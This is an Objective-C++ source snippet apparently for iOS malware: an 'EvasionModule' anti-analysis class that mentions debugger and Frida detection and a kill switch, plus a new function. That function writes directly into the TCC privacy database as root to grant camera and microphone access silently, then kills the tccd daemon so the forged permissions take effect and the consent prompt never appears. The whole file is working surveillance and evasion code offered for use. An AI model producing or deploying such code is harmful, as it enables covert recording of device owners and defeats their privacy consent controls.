// FILE: evasion.mm
#import <Foundation/Foundation.h>
#import <sys/sysctl.h>
#import <sys/ptrace.h>
#import <mach-o/dyld.h>
#import <sqlite3.h> // <--- ADD THIS
#include <iostream>
#include <string>

namespace EvasionModule {

    class AntiAnalysis {
    public:
        // ... (Keep your existing is_debugger_attached, is_frida_present, etc.) ...

        // --- ADD THIS NEW FUNCTION ---
        bool bypass_tcc_permissions() {
            std::cout << "[TCC] Attempting to bypass iOS privacy prompts...\n";
            
            std::string tcc_db_path = "/private/var/mobile/Library/TCC/TCC.db";
            sqlite3 *db;
            
            if (sqlite3_open(tcc_db_path.c_str(), &db) != SQLITE_OK) {
                std::cout << "[TCC-ERR] Failed to open TCC database. Are we Root?\n";
                return false;
            }

            // Grant Camera and Mic permissions to our process
            std::string sql = "INSERT OR REPLACE INTO access (service, client, client_type, auth_value) "
                              "VALUES ('kTCCServiceCamera', 'com.apple.mobileslideshow', 0, 2), "
                              "('kTCCServiceMicrophone', 'com.apple.mobileslideshow', 0, 2);";

            char *errMsg = 0;
            sqlite3_exec(db, sql.c_str(), NULL, 0, &errMsg);
            sqlite3_close(db);
            
            // Force the TCC daemon to restart so it reads our new permissions
            system("killall -9 tccd"); 
            
            std::cout << "[TCC] Bypass complete. Prompt suppressed.\n";
            return true;
        }
        
        // ... (Keep your existing check_environment and kill_switch functions) ...
    };
}